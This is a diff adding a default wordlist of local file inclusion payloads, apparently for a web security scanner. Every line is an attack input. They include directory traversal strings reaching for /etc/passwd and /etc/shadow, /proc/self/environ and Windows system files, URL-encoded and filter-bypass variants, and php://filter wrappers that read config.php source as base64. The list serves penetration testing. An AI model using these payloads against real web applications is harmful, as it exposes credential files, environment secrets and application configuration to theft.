@@ -1,0 +1,25 @@
+# LFI Payloads — Built-in Default List
+# Add your own by creating wordlists/custom/lfi_custom.txt
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/windows/win.ini
+/windows/system32/drivers/etc/hosts
+..%2F..%2Fetc%2Fpasswd
+..%252F..%252Fetc%252Fpasswd
+%2e%2e/%2e%2e/etc/passwd
+....//....//etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../config.php
+file:///etc/passwd
